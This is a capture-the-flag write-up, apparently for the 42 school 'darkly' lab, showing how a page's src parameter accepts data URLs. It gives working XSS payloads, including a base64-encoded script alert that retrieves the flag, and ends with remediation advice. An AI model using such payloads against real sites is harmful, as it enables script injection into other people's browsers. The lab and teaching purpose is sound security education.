# Cross Site Scripting (XSS) - Data URLs

In the first section of the home page, an image redirect to [the location](http://192.168.56.101/?page=media&src=nsa) where an `object` tag specifies the URL of NSA logotype, via `data` attribute.

The value of `data` attribute change accordingly the value GET parameter `src` in the URL.

Using special format, called [Data URLs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs), in `src` allow to embed small inline data in HTML document.

<details>
<summary>Embed a text file</summary>

```
data:text/html,<h1 style="font-size:75px; background-color:red">Hello World!</h1>
```
<img width="1680" alt="image" src="https://user-images.githubusercontent.com/22397481/207857428-9feaa61f-fc22-4b38-9168-dcad62fd70fa.png">
</details>

<details>
<summary>Embed an image</summary>

```
data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAAo0lEQVR42u3RAQ0AAAjDMO5fNCCDkG4SmupdZwoQIAICRECACAgQAQECBIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACIiAABEQIAICRECACAgQIEAEBIiAABGQ7w2x48edS3GF7AAAAABJRU5ErkJggg==
```
<img width="1680" alt="image" src="https://user-images.githubusercontent.com/22397481/207856826-f0abe6b6-e29e-4c57-bf88-ef8dcb737ca0.png">
</details>

<details>
<summary>Embed a scipt</summary>

```
data:text/html,<script>alert('42 - The answer to life, the universe and everything')</script>
```
<img width="1680" alt="image" src="https://user-images.githubusercontent.com/22397481/207857154-5443b8d2-b45c-4fc0-a0e6-6b828ffcab8a.png">

</details>


Passing the script encoded in `base64` and using appropriate syntax `data:[<mediatype>][;base64],<data>` gives the flag
```sh
┌──$ [~/42/2022/darkly]
└─>  echo -n "<script>alert('42 - The answer to life, the universe and everything')</script>" | base64
PHNjcmlwdD5hbGVydCgnNDIgLSBUaGUgYW5zd2VyIHRvIGxpZmUsIHRoZSB1bml2ZXJzZSBhbmQgZXZlcnl0aGluZycpPC9zY3JpcHQ+
```
<img width="1680" alt="image" src="https://user-images.githubusercontent.com/22397481/207858953-5b451dce-3444-407a-8dd4-f92fdb4ff12e.png">

# Remediation
- **Sanitize user input** checking for malicious code (for example using [DOMPurify](https://github.com/cure53/DOMPurify))
- **Escaping user input** from XSS to ensuring it’s secure before rendering it for the end user

***
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- https://owasp.org/www-community/attacks/xss/
